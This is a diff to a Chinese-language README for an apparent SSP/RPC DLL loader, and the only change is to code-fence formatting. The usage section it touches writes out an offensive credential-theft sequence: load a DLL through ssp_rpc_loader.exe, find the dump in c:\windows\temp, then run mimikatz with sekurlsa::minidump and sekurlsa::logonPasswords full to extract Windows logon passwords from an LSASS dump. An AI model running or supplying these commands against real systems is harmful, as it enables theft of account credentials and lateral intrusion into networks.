@@ -9,8 +9,8 @@
 
 对于代码做了部分修改，使用vs2019编译，选择x64编译
 # 使用方法
-···
+```
 ssp_rpc_loader.exe Dll1.dll
 dir c:\windows\temp
 mimikatz.exe "sekurlsa::minidump 1.bin" "sekurlsa::logonPasswords full" "exit"
-···
+```
